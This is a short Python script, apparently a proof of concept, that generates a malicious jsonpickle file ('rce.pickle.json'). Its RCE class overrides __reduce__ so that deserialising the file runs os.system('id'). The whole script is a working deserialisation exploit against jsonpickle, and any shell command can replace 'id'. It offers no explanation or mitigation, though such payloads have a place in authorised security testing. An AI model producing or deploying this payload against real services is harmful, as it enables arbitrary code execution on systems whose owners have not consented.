import jsonpickle
import os

class RCE:
    def __reduce__(self):
        return os.system, ("id",)

def main():
    output_file = "rce.pickle.json"
    with open("rce.pickle.json", "w") as fo:
        fo.write(jsonpickle.dumps(RCE()))

    print("Saved in {}".format(output_file))

if __name__ == "__main__":
    exit(main())
